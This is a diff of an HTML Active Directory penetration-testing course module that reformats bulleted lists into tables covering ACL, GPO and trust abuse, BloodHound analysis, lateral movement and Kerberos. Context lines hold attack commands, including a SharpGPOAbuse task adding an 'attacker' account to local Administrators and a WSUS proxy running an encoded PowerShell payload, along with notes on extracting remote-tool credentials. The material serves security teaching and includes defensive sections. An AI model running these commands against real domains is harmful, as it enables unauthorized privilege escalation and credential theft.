@@ -885,11 +885,14 @@ Get-DomainComputer -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" | 
 
 <h5 id="cape-access-control-lists-overview-cd8061">Access Control Lists Overview</h5>
 <p>Every AD object has a security descriptor containing:</p>
-<ul>
-<li><strong>DACL (Discretionary ACL)</strong>: a list of ACEs that define who can access the object and what operations they can perform</li>
-<li><strong>SACL (System ACL)</strong>: controls auditing of access attempts</li>
-<li><strong>Owner</strong>: the security principal that owns the object and can always modify its DACL</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Component</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>DACL (Discretionary ACL)</td><td>A list of ACEs that define who can access the object and what operations they can perform</td></tr>
+<tr><td>SACL (System ACL)</td><td>Controls auditing of access attempts</td></tr>
+<tr><td>Owner</td><td>The security principal that owns the object and can always modify its DACL</td></tr>
+</tbody>
+</table>
 <p>Each ACE specifies a trustee (user/group SID), an access mask (the permission), and whether it is an allow or deny entry. Key abusable permissions include GenericAll, GenericWrite, WriteDacl, WriteOwner, ForceChangePassword, and AddMembers.</p>
 
 <h5 id="cape-abusable-acl-rights-1460d2">Abusable ACL Rights</h5>
@@ -1003,12 +1006,15 @@ Get-DomainSPNTicket -Identity targetuser</code></pre>
 
 <h5 id="cape-gpo-abuse-overview-ee743c">GPO Abuse Overview</h5>
 <p>GPO abuse requires write permissions on the GPO object itself or its linked OU/domain. An attacker who can modify a GPO linked to an OU containing Domain Controllers or privileged workstations can achieve code execution in those contexts. Common GPO abuse vectors:</p>
-<ul>
-<li><strong>Immediate Scheduled Task</strong>: create a one-time task via GPO Preferences that executes a payload</li>
-<li><strong>Startup/Logon Script</strong>: add a script that runs on machine startup or user logon</li>
-<li><strong>Restricted Groups / Group Policy Preferences Groups</strong>: add an attacker account to local Administrators via GPO</li>
-<li><strong>Software Installation</strong>: deploy a malicious MSI package</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Vector</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Immediate Scheduled Task</td><td>Create a one-time task via GPO Preferences that executes a payload</td></tr>
+<tr><td>Startup/Logon Script</td><td>Add a script that runs on machine startup or user logon</td></tr>
+<tr><td>Restricted Groups / Group Policy Preferences Groups</td><td>Add an attacker account to local Administrators via GPO</td></tr>
+<tr><td>Software Installation</td><td>Deploy a malicious MSI package</td></tr>
+</tbody>
+</table>
 
 <h5 id="cape-gathering-gpo-data-eb5f0a">Gathering GPO Data</h5>
 <pre><code class="language-powershell"># All GPOs in the domain
@@ -1041,13 +1047,16 @@ Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=corp,DC=local" -Resolv
 
 <h5 id="cape-hidden-gpo-code-execution-paths-356d85">Hidden GPO Code Execution Paths</h5>
 <p>GPOs support several less obvious code execution mechanisms beyond scripts and software deployment:</p>
-<ul>
-<li><strong>Registry settings</strong>: set a Run key or Image File Execution Options debugger</li>
-<li><strong>Scheduled Tasks (Preferences)</strong>: tasks in <code>Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</code></li>
-<li><strong>Services (Preferences)</strong>: create or modify a Windows service via <code>Machine\Preferences\Services\Services.xml</code></li>
-<li><strong>Files (Preferences)</strong>: copy a file to a target path (e.g., place a DLL for DLL hijacking)</li>
-<li><strong>Environment variables</strong>: set variables that influence program behavior</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Mechanism</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Registry settings</td><td>Set a Run key or Image File Execution Options debugger</td></tr>
+<tr><td>Scheduled Tasks (Preferences)</td><td>Tasks in <code>Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</code></td></tr>
+<tr><td>Services (Preferences)</td><td>Create or modify a Windows service via <code>Machine\Preferences\Services\Services.xml</code></td></tr>
+<tr><td>Files (Preferences)</td><td>Copy a file to a target path, such as placing a DLL for DLL hijacking</td></tr>
+<tr><td>Environment variables</td><td>Set variables that influence program behavior</td></tr>
+</tbody>
+</table>
 <pre><code class="language-powershell"># Using SharpGPOAbuse to add an immediate scheduled task
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "CORP\Domain Admins" --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "Default Domain Policy"
 
@@ -1094,13 +1103,16 @@ bloodhound-python -u user -p Password123 -d corp.local -ns 10.10.10.10 -c Trusts
 
 <h5 id="cape-attacking-trust-relationships-f2a9ea">Attacking Trust Relationships</h5>
 <p>Common attacks across trust boundaries:</p>
-<ul>
-<li><strong>Intra-forest (parent-child)</strong>: ExtraSids attack with a forged Golden Ticket containing the Enterprise Admins SID. SID filtering is not enforced within a forest, making this the primary escalation path from child to parent domain.</li>
-<li><strong>Cross-forest Kerberoasting</strong>: if a user in the trusted forest has an SPN, request a TGS ticket across the trust and crack it offline.</li>
-<li><strong>Foreign group membership</strong>: users from one domain may be members of privileged groups in another domain. Enumerate with <code>Get-DomainForeignGroupMember</code>.</li>
-<li><strong>Trust account abuse</strong>: the trust account password can be extracted from a compromised DC and used to forge inter-realm tickets.</li>
-<li><strong>SID History injection</strong>: if SID filtering is misconfigured or disabled on a forest trust, inject a privileged SID into the SID History to gain access across the trust boundary.</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Attack Type</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Intra-forest (parent-child)</td><td>ExtraSids attack with a forged Golden Ticket containing the Enterprise Admins SID. SID filtering is not enforced within a forest, making this the primary escalation path from child to parent domain.</td></tr>
+<tr><td>Cross-forest Kerberoasting</td><td>If a user in the trusted forest has an SPN, request a TGS ticket across the trust and crack it offline.</td></tr>
+<tr><td>Foreign group membership</td><td>Users from one domain may be members of privileged groups in another domain. Enumerate with <code>Get-DomainForeignGroupMember</code>.</td></tr>
+<tr><td>Trust account abuse</td><td>The trust account password can be extracted from a compromised DC and used to forge inter-realm tickets.</td></tr>
+<tr><td>SID History injection</td><td>If SID filtering is misconfigured or disabled on a forest trust, inject a privileged SID into the SID History to gain access across the trust boundary.</td></tr>
+</tbody>
+</table>
 <pre><code class="language-powershell"># Find foreign group members
 Get-DomainForeignGroupMember | Select-Object GroupDomain, GroupName, MemberName, MemberDomain
 
@@ -1202,13 +1214,16 @@ C:\Users\&lt;user&gt;\AppData\Roaming\Neo4j Community Edition\data\dbms\auth</co
 <h4 id="cape-bloodhound-overview-and-graph-theory-392838">3.1.2 BloodHound Overview and Graph Theory</h4>
 <p>BloodHound models Active Directory as a directed property graph. Every AD object (user, computer, group, domain, OU, GPO) is represented as a <strong>node</strong>. Relationships between objects (group membership, local admin rights, session data, ACL permissions) are represented as <strong>edges</strong>. An attack path is a sequence of edges from a controlled principal to a target objective.</p>
 <p>Key graph theory concepts relevant to BloodHound:</p>
-<ul>
-<li><strong>Nodes</strong>: represent AD principals and objects (users, computers, groups, domains, OUs, GPOs)</li>
-<li><strong>Edges</strong>: represent relationships and permissions (MemberOf, AdminTo, HasSession, GenericAll, WriteDacl)</li>
-<li><strong>Paths</strong>: ordered sequences of nodes connected by edges. The shortest path between two nodes is the most direct attack route</li>
-<li><strong>Degree</strong>: number of edges connected to a node. High-degree nodes (e.g., Domain Admins group) are critical choke points</li>
-<li><strong>Transitive closure</strong>: group memberships are transitive. If A is a member of B, and B is a member of C, then A effectively has C's permissions</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Nodes</td><td>represent AD principals and objects (users, computers, groups, domains, OUs, GPOs)</td></tr>
+<tr><td>Edges</td><td>represent relationships and permissions (MemberOf, AdminTo, HasSession, GenericAll, WriteDacl)</td></tr>
+<tr><td>Paths</td><td>ordered sequences of nodes connected by edges. The shortest path between two nodes is the most direct attack route</td></tr>
+<tr><td>Degree</td><td>number of edges connected to a node. High-degree nodes (e.g., Domain Admins group) are critical choke points</td></tr>
+<tr><td>Transitive closure</td><td>group memberships are transitive. If A is a member of B, and B is a member of C, then A effectively has C's permissions</td></tr>
+</tbody>
+</table>
 <p>BloodHound uses the Cypher query language to traverse the graph, which allows analysts to ask questions like "find all paths from Kerberoastable users to Domain Admins" in a single query.</p>
 
 
@@ -1401,12 +1416,15 @@ bloodhound-python -c DCOnly -d corp.local -u jdoe -p 'P@ss123' -ns 10.10.10.1 --
 
 <h5 id="cape-upper-right-menu-and-settings-46a61e">Upper Right Menu and Settings</h5>
 <p>The upper-right menu provides access to:</p>
-<ul>
-<li><strong>Settings</strong>: toggle node labels, edge labels, dark mode</li>
-<li><strong>Export</strong>: save the current graph view as an image (PNG/SVG)</li>
-<li><strong>Layout</strong>: switch between directed and hierarchical graph layouts</li>
-<li><strong>Debug</strong>: view raw Cypher queries executed by the GUI</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Settings</td><td>toggle node labels, edge labels, dark mode</td></tr>
+<tr><td>Export</td><td>save the current graph view as an image (PNG/SVG)</td></tr>
+<tr><td>Layout</td><td>switch between directed and hierarchical graph layouts</td></tr>
+<tr><td>Debug</td><td>view raw Cypher queries executed by the GUI</td></tr>
+</tbody>
+</table>
 
 <h5 id="cape-database-info-fbe487">Database Info</h5>
 <p>The Database Info panel displays statistics about the imported data:</p>
@@ -1435,14 +1453,17 @@ bloodhound-python -c DCOnly -d corp.local -u jdoe -p 'P@ss123' -ns 10.10.10.1 --
 
 <h5 id="cape-key-node-information-categories-4171e8">Key Node Information Categories</h5>
 <p>Click any node to open its info panel, which displays multiple tabs:</p>
-<ul>
-<li><strong>Overview</strong>: basic object properties (name, domain, SID, enabled status)</li>
-<li><strong>Group Membership</strong>: direct and transitive (unrolled) memberships</li>
-<li><strong>Local Admin Rights</strong>: computers where this principal has admin access</li>
-<li><strong>Execution Rights</strong>: RDP, DCOM, PSRemote, SQLAdmin</li>
-<li><strong>Outbound Control</strong>: objects this principal has control over via ACLs</li>
-<li><strong>Inbound Control</strong>: principals that have control over this object</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Overview</td><td>basic object properties (name, domain, SID, enabled status)</td></tr>
+<tr><td>Group Membership</td><td>direct and transitive (unrolled) memberships</td></tr>
+<tr><td>Local Admin Rights</td><td>computers where this principal has admin access</td></tr>
+<tr><td>Execution Rights</td><td>RDP, DCOM, PSRemote, SQLAdmin</td></tr>
+<tr><td>Outbound Control</td><td>objects this principal has control over via ACLs</td></tr>
+<tr><td>Inbound Control</td><td>principals that have control over this object</td></tr>
+</tbody>
+</table>
 
 <h4 id="cape-edges-2ca638">3.3.3 Edges</h4>
 <p>Edges represent relationships between nodes. Understanding edge types is critical for identifying abuse paths.</p>
@@ -1471,22 +1492,28 @@ bloodhound-python -c DCOnly -d corp.local -u jdoe -p 'P@ss123' -ns 10.10.10.1 --
 
 <h5 id="cape-how-to-abuse-edges-66f643">Edge Abuse</h5>
 <p>Right-click an edge in BloodHound and select "Help" to see step-by-step abuse instructions. Each edge type has documented abuse primitives. Common patterns:</p>
-<ul>
-<li><strong>GenericAll on User</strong>: reset password, set SPN for Kerberoasting, or write to msDS-KeyCredentialLink (Shadow Credentials)</li>
-<li><strong>GenericAll on Group</strong>: add yourself as a member</li>
-<li><strong>GenericAll on Computer</strong>: configure RBCD for lateral movement</li>
-<li><strong>WriteDacl</strong>: add GenericAll ACE for yourself on the target, then abuse that</li>
-<li><strong>WriteOwner</strong>: take ownership, then WriteDacl to add permissions</li>
-<li><strong>HasSession + AdminTo</strong>: dump credentials from the session host</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>GenericAll on User</td><td>reset password, set SPN for Kerberoasting, or write to msDS-KeyCredentialLink (Shadow Credentials)</td></tr>
+<tr><td>GenericAll on Group</td><td>add yourself as a member</td></tr>
+<tr><td>GenericAll on Computer</td><td>configure RBCD for lateral movement</td></tr>
+<tr><td>WriteDacl</td><td>add GenericAll ACE for yourself on the target, then abuse that</td></tr>
+<tr><td>WriteOwner</td><td>take ownership, then WriteDacl to add permissions</td></tr>
+<tr><td>HasSession + AdminTo</td><td>dump credentials from the session host</td></tr>
+</tbody>
+</table>
 
 <h5 id="cape-bloodhound-edge-playground-reference-6320e0">BloodHound Edge Playground Reference</h5>
 <p>The BloodHound Edge Playground is a community-maintained reference documenting every edge type with abuse information, required tools, and OPSEC considerations. Key reference edges for offensive operations:</p>
-<ul>
-<li><strong>Transitive edges</strong>: MemberOf is transitive; if User A is in Group B and Group B is in Group C, User A inherits Group C's permissions</li>
-<li><strong>Composite edges</strong>: some attack paths require chaining multiple edges (e.g., ForceChangePassword + HasSession + AdminTo)</li>
-<li><strong>Shortcut edges</strong>: GenericAll encompasses multiple individual rights and is the most powerful single ACL edge</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Transitive edges</td><td>MemberOf is transitive; if User A is in Group B and Group B is in Group C, User A inherits Group C's permissions</td></tr>
+<tr><td>Composite edges</td><td>some attack paths require chaining multiple edges (e.g., ForceChangePassword + HasSession + AdminTo)</td></tr>
+<tr><td>Shortcut edges</td><td>GenericAll encompasses multiple individual rights and is the most powerful single ACL edge</td></tr>
+</tbody>
+</table>
 
 <h4 id="cape-analyzing-bloodhound-data-34e01e">3.3.4 Analyzing BloodHound Data</h4>
 <p>BloodHound's value is in finding non-obvious attack paths. Structured analysis focuses on domain mapping, pre-built queries, and session-based attacks.</p>
@@ -1510,15 +1537,18 @@ MATCH (c:Computer)-[:MemberOf*1..]->(g:Group {name:"DOMAIN CONTROLLERS@CORP.LOCA
 
 <h5 id="cape-pre-built-analytics-queries-f949e7">Pre-Built Analytics Queries</h5>
 <p>BloodHound ships with pre-built queries accessible from the Analysis tab:</p>
-<ul>
-<li><strong>Find All Domain Admins</strong>: maps members of Domain Admins and equivalent groups</li>
-<li><strong>Find Shortest Paths to Domain Admins</strong>: shows the most direct routes</li>
-<li><strong>Find Kerberoastable Users with Most Privileges</strong>: identifies high-value SPN accounts</li>
-<li><strong>Find AS-REP Roastable Users</strong>: users with "Do not require pre-auth" set</li>
-<li><strong>Find Principals with DCSync Rights</strong>: users/groups with replication permissions</li>
-<li><strong>Shortest Paths from Owned Principals</strong>: attack paths from already-compromised accounts</li>
-<li><strong>Find Computers with Unconstrained Delegation</strong>: potential TGT capture hosts</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Find All Domain Admins</td><td>maps members of Domain Admins and equivalent groups</td></tr>
+<tr><td>Find Shortest Paths to Domain Admins</td><td>shows the most direct routes</td></tr>
+<tr><td>Find Kerberoastable Users with Most Privileges</td><td>identifies high-value SPN accounts</td></tr>
+<tr><td>Find AS-REP Roastable Users</td><td>users with "Do not require pre-auth" set</td></tr>
+<tr><td>Find Principals with DCSync Rights</td><td>users/groups with replication permissions</td></tr>
+<tr><td>Shortest Paths from Owned Principals</td><td>attack paths from already-compromised accounts</td></tr>
+<tr><td>Find Computers with Unconstrained Delegation</td><td>potential TGT capture hosts</td></tr>
+</tbody>
+</table>
 
 <h5 id="cape-finding-sessions-and-using-owned-princip-2c8718">Finding Sessions and Using Owned Principals</h5>
 <p>Mark compromised principals as "Owned" (right-click a node, select "Mark as Owned"). This enables BloodHound's most powerful query: "Shortest Paths from Owned Principals to Domain Admins." As new credentials are captured during an engagement, continue marking principals as owned to reveal new paths.</p>
@@ -1626,13 +1656,16 @@ MATCH (u)-[:AllowedToDelegate]-&gt;(c:Computer) RETURN u.name, c.name</code></pr
 
 <h4 id="cape-bloodhound-for-blue-teams-bab312">3.4.2 BloodHound for Blue Teams</h4>
 <p>Defenders use BloodHound to identify and eliminate attack paths before adversaries exploit them. The approach mirrors offensive analysis but focuses on remediation:</p>
-<ul>
-<li><strong>Identify Tier-Zero attack paths</strong>: find all paths to Domain Admins and prioritize breaking the shortest ones</li>
-<li><strong>Audit ACLs</strong>: run queries for excessive permissions (GenericAll, WriteDacl on sensitive objects)</li>
-<li><strong>Review delegation</strong>: find unconstrained and constrained delegation misconfigurations</li>
-<li><strong>Session hygiene</strong>: identify machines where privileged users have sessions on low-trust workstations</li>
-<li><strong>Group membership sprawl</strong>: find nested group memberships that grant unintended privileges</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Identify Tier-Zero attack paths</td><td>find all paths to Domain Admins and prioritize breaking the shortest ones</td></tr>
+<tr><td>Audit ACLs</td><td>run queries for excessive permissions (GenericAll, WriteDacl on sensitive objects)</td></tr>
+<tr><td>Review delegation</td><td>find unconstrained and constrained delegation misconfigurations</td></tr>
+<tr><td>Session hygiene</td><td>identify machines where privileged users have sessions on low-trust workstations</td></tr>
+<tr><td>Group membership sprawl</td><td>find nested group memberships that grant unintended privileges</td></tr>
+</tbody>
+</table>
 <pre><code class="language-bash"># Defensive Cypher: find all attack paths to Tier-Zero
 MATCH p=shortestPath((n)-[*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) WHERE NOT n=g RETURN p
 
@@ -1682,13 +1715,16 @@ MATCH (u:User {enabled:true})-[:MemberOf*1..]-&gt;(g:Group {highvalue:true}) WHE
 
 <h4 id="cape-azure-attacks-via-bloodhound-4bf912">3.5.2 Azure Attacks via BloodHound</h4>
 <p>BloodHound CE supports Azure attack path analysis alongside on-premises AD. Common Azure AD attack paths:</p>
-<ul>
-<li><strong>Global Administrator</strong>: equivalent to Domain Admin in Azure. Any path to GA is a domain compromise path</li>
-<li><strong>Application Admin / Cloud App Admin</strong>: can add credentials to existing app registrations with high privileges</li>
-<li><strong>Privileged Role Administrator</strong>: can assign any Azure AD role, including Global Administrator</li>
-<li><strong>Service Principal abuse</strong>: service principals with high Azure RBAC roles can be targeted via exposed credentials in code repositories or Key Vault misconfigurations</li>
-<li><strong>Hybrid paths</strong>: Azure AD Connect syncs on-premises AD to Azure AD. Compromising the sync account can lead to cloud compromise, and vice versa</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Global Administrator</td><td>equivalent to Domain Admin in Azure. Any path to GA is a domain compromise path</td></tr>
+<tr><td>Application Admin / Cloud App Admin</td><td>can add credentials to existing app registrations with high privileges</td></tr>
+<tr><td>Privileged Role Administrator</td><td>can assign any Azure AD role, including Global Administrator</td></tr>
+<tr><td>Service Principal abuse</td><td>service principals with high Azure RBAC roles can be targeted via exposed credentials in code repositories or Key Vault misconfigurations</td></tr>
+<tr><td>Hybrid paths</td><td>Azure AD Connect syncs on-premises AD to Azure AD. Compromising the sync account can lead to cloud compromise, and vice versa</td></tr>
+</tbody>
+</table>
 <pre><code class="language-bash"># Cypher: find all paths to Global Administrator role
 MATCH p=shortestPath((n)-[*1..]-&gt;(r:AZRole {displayname:"Global Administrator"})) RETURN p
 
@@ -1722,12 +1758,15 @@ MATCH (sp:AZServicePrincipal)-[:AZOwns]-&gt;(s:AZSubscription) RETURN sp.display
 <figure><img src="./img/cape/network-topology.png" style="max-width:440px" alt="Network topology diagram showing domain environment"></figure>
 
 <p>Core concepts:</p>
-<ul>
-<li><strong>Administrative shares</strong>: <code>C$</code>, <code>ADMIN$</code>, and <code>IPC$</code> are hidden shares accessible to local administrators. Most lateral movement tools use these shares to stage payloads or execute commands</li>
-<li><strong>Authentication material</strong>: plaintext passwords, NTLM hashes (pass-the-hash), Kerberos tickets (pass-the-ticket), or certificates (pass-the-certificate)</li>
-<li><strong>Logon types</strong>: different lateral movement techniques produce different Windows logon events (Type 3 Network, Type 10 RemoteInteractive, Type 7 Unlock). This affects which credential material is cached on the target</li>
-<li><strong>Local admin requirement</strong>: most lateral movement techniques require the authenticating principal to be a local administrator on the target. Exceptions include RDP (Remote Desktop Users group) and WinRM (Remote Management Users)</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Administrative shares</td><td><code>C$</code>, <code>ADMIN$</code>, and <code>IPC$</code> are hidden shares accessible to local administrators. Most lateral movement tools use these shares to stage payloads or execute commands</td></tr>
+<tr><td>Authentication material</td><td>plaintext passwords, NTLM hashes (pass-the-hash), Kerberos tickets (pass-the-ticket), or certificates (pass-the-certificate)</td></tr>
+<tr><td>Logon types</td><td>different lateral movement techniques produce different Windows logon events (Type 3 Network, Type 10 RemoteInteractive, Type 7 Unlock). This affects which credential material is cached on the target</td></tr>
+<tr><td>Local admin requirement</td><td>most lateral movement techniques require the authenticating principal to be a local administrator on the target. Exceptions include RDP (Remote Desktop Users group) and WinRM (Remote Management Users)</td></tr>
+</tbody>
+</table>
 
 <h3 id="cape-rdp-and-remote-administration-433fb8">4.2 RDP and Remote Administration</h3>
 <p>RDP provides an interactive graphical session on the target host. It uses TCP port 3389 by default and creates a Type 10 (RemoteInteractive) logon, which caches credentials on the target.</p>
@@ -1808,11 +1847,14 @@ ssh -D 1080 admin@10.10.10.50</code></pre>
 
 <h4 id="cape-remote-management-tools-vnc-anydesk-team-6b4d1e">4.2.3 Remote Management Tools (VNC, AnyDesk, TeamViewer)</h4>
 <p>Third-party remote management tools installed for legitimate purposes can be abused for lateral movement. Look for these during enumeration:</p>
-<ul>
-<li><strong>VNC</strong>: often uses port 5900. Credentials may be stored in registry or configuration files and can be extracted</li>
-<li><strong>AnyDesk</strong>: uses its own protocol. Unattended access passwords are stored locally and can be extracted from <code>%ProgramData%\AnyDesk\system.conf</code></li>
-<li><strong>TeamViewer</strong>: stores credentials in the Windows registry. Tools like <code>TeamViewer_Passwordeer</code> can extract them</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>VNC</td><td>often uses port 5900. Credentials may be stored in registry or configuration files and can be extracted</td></tr>
+<tr><td>AnyDesk</td><td>uses its own protocol. Unattended access passwords are stored locally and can be extracted from <code>%ProgramData%\AnyDesk\system.conf</code></td></tr>
+<tr><td>TeamViewer</td><td>stores credentials in the Windows registry. Tools like <code>TeamViewer_Passwordeer</code> can extract them</td></tr>
+</tbody>
+</table>
 <pre><code class="language-powershell"># Find remote management tools
 Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -match "VNC|AnyDesk|TeamViewer" }
 
@@ -2117,11 +2159,14 @@ $com.Document.Application.ShellExecute("cmd.exe", "/c net user /domain", "C:\Win
 <p>Enterprise software deployment tools (SCCM, PDQ Deploy, ManageEngine) and GPO-based software installation provide legitimate mechanisms for remote code execution. If an attacker gains access to these platforms, they can deploy payloads to any managed system.</p>
 <h4 id="cape-software-deployment-and-remote-managemen-cb5602">4.5.1 Software Deployment and Remote Management</h4>
 <p>Enterprise software deployment tools (SCCM, PDQ Deploy, ManageEngine) and GPO-based software installation provide legitimate mechanisms for remote code execution. If an attacker gains access to these platforms, they can deploy payloads to any managed system.</p>
-<ul>
-<li><strong>SCCM</strong>: see Module 15 for detailed SCCM exploitation</li>
-<li><strong>PDQ Deploy</strong>: compromising the PDQ server allows pushing packages to all managed endpoints. Credentials for the deployment service account are often stored locally</li>
-<li><strong>GPO Software Installation</strong>: users with GPO edit rights can add MSI packages that install on all computers in the linked OU at next Group Policy refresh</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>SCCM</td><td>see Module 15 for detailed SCCM exploitation</td></tr>
+<tr><td>PDQ Deploy</td><td>compromising the PDQ server allows pushing packages to all managed endpoints. Credentials for the deployment service account are often stored locally</td></tr>
+<tr><td>GPO Software Installation</td><td>users with GPO edit rights can add MSI packages that install on all computers in the linked OU at next Group Policy refresh</td></tr>
+</tbody>
+</table>
 <pre><code class="language-powershell"># Enumerate GPOs that deploy software
 Get-GPO -All | ForEach-Object {
     $gpoId = $_.Id
@@ -2166,23 +2211,29 @@ python wsuspect_proxy.py -c "C:\Windows\System32\cmd.exe" -a "/c powershell -enc
 
 <h4 id="cape-general-considerations-e91b8e">4.5.3 General Considerations</h4>
 <p>Key operational considerations for lateral movement:</p>
-<ul>
-<li><strong>Credential material types</strong>: plaintext passwords work with all methods. NTLM hashes work with PtH-compatible tools (SMB, WMI, WinRM via evil-winrm). Kerberos tickets work with pass-the-ticket. Choose the method that matches your available credential material</li>
-<li><strong>Logon type impact</strong>: Type 3 (Network) logons do NOT cache credentials on the target. Type 10 (RemoteInteractive/RDP) logons DO cache credentials. Prefer Type 3 when possible to avoid leaving credential material behind</li>
-<li><strong>Token impersonation</strong>: after lateral movement, the security context may not match what you expect. Use <code>whoami</code> and <code>klist</code> to verify the current identity and available tickets</li>
-<li><strong>Cleanup</strong>: remove artifacts (uploaded binaries, created services, scheduled tasks) after completing objectives on each host. Tools like PsExec create and delete a service automatically, but the event logs persist</li>
-<li><strong>Port requirements</strong>: verify that the required ports (445, 135, 5985, 3389) are accessible from your current position. Use <code>Test-NetConnection</code> or <code>nmap</code> to check before attempting lateral movement</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Credential material types</td><td>plaintext passwords work with all methods. NTLM hashes work with PtH-compatible tools (SMB, WMI, WinRM via evil-winrm). Kerberos tickets work with pass-the-ticket. Choose the method that matches your available credential material</td></tr>
+<tr><td>Logon type impact</td><td>Type 3 (Network) logons do NOT cache credentials on the target. Type 10 (RemoteInteractive/RDP) logons DO cache credentials. Prefer Type 3 when possible to avoid leaving credential material behind</td></tr>
+<tr><td>Token impersonation</td><td>after lateral movement, the security context may not match what you expect. Use <code>whoami</code> and <code>klist</code> to verify the current identity and available tickets</td></tr>
+<tr><td>Cleanup</td><td>remove artifacts (uploaded binaries, created services, scheduled tasks) after completing objectives on each host. Tools like PsExec create and delete a service automatically, but the event logs persist</td></tr>
+<tr><td>Port requirements</td><td>verify that the required ports (445, 135, 5985, 3389) are accessible from your current position. Use <code>Test-NetConnection</code> or <code>nmap</code> to check before attempting lateral movement</td></tr>
+</tbody>
+</table>
 
 <h4 id="cape-lateral-movement-prevention-and-detectio-1e4a4b">4.5.4 Lateral Movement Prevention and Detection</h4>
 <p>Defending against lateral movement requires a layered approach combining network segmentation, privilege management, and monitoring.</p>
-<ul>
-<li><strong>Network segmentation</strong>: restrict SMB (445), WinRM (5985/5986), and RDP (3389) traffic between workstations. Only allow these protocols from management hosts to servers</li>
-<li><strong>Privileged Access Workstations (PAW)</strong>: administer Tier-0 assets (DCs, ADCS, SCCM) only from hardened PAWs. Do not use privileged credentials on lower-tier workstations</li>
-<li><strong>Local Administrator Password Solution (LAPS)</strong>: randomize local admin passwords on every machine to prevent pass-the-hash between hosts</li>
-<li><strong>Windows Defender Credential Guard</strong>: protects LSASS from credential dumping by running it in a virtualized container</li>
-<li><strong>Protected Users group</strong>: members cannot use NTLM, DES, or RC4 Kerberos encryption. Credentials are never cached</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Network segmentation</td><td>restrict SMB (445), WinRM (5985/5986), and RDP (3389) traffic between workstations. Only allow these protocols from management hosts to servers</td></tr>
+<tr><td>Privileged Access Workstations (PAW)</td><td>administer Tier-0 assets (DCs, ADCS, SCCM) only from hardened PAWs. Do not use privileged credentials on lower-tier workstations</td></tr>
+<tr><td>Local Administrator Password Solution (LAPS)</td><td>randomize local admin passwords on every machine to prevent pass-the-hash between hosts</td></tr>
+<tr><td>Windows Defender Credential Guard</td><td>protects LSASS from credential dumping by running it in a virtualized container</td></tr>
+<tr><td>Protected Users group</td><td>members cannot use NTLM, DES, or RC4 Kerberos encryption. Credentials are never cached</td></tr>
+</tbody>
+</table>
 <p>Detection rules:</p>
 <table class="custom-table">
 <thead><tr><th>Technique</th><th>Event ID</th><th>Detection</th></tr></thead>
@@ -2955,12 +3006,15 @@ creds -id 1 --host</code></pre>
 <p>The <strong>Privilege Attribute Certificate (PAC)</strong> is embedded in every Kerberos ticket. It contains the user's security identifier (SID), group memberships, and privileges. The target service reads the PAC to make authorization decisions. PAC validation against the KDC is optional and often skipped for performance, which enables several attack techniques.</p>
 
 <p>Key Kerberos concepts:</p>
-<ul>
-<li><strong>Service Principal Name (SPN)</strong>: a unique identifier that ties a service instance to a logon account (e.g., <code>MSSQLSvc/db01.corp.local:1433</code>)</li>
-<li><strong>Pre-authentication</strong>: proves the client knows the password before the KDC issues a TGT. Disabling it enables AS-REP Roasting</li>
-<li><strong>Ticket lifetime</strong>: TGTs default to 10 hours with a 7-day renewal window. Service tickets default to 10 hours</li>
-<li><strong>Encryption types</strong>: RC4 (0x17, uses NTLM hash), AES128 (0x11), AES256 (0x12). Modern environments prefer AES</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Service Principal Name (SPN)</td><td>a unique identifier that ties a service instance to a logon account (e.g., <code>MSSQLSvc/db01.corp.local:1433</code>)</td></tr>
+<tr><td>Pre-authentication</td><td>proves the client knows the password before the KDC issues a TGT. Disabling it enables AS-REP Roasting</td></tr>
+<tr><td>Ticket lifetime</td><td>TGTs default to 10 hours with a 7-day renewal window. Service tickets default to 10 hours</td></tr>
+<tr><td>Encryption types</td><td>RC4 (0x17, uses NTLM hash), AES128 (0x11), AES256 (0x12). Modern environments prefer AES</td></tr>
+</tbody>
+</table>
 
 <h3 id="cape-roasting-attacks-5e7fba">6.2 Roasting Attacks</h3>
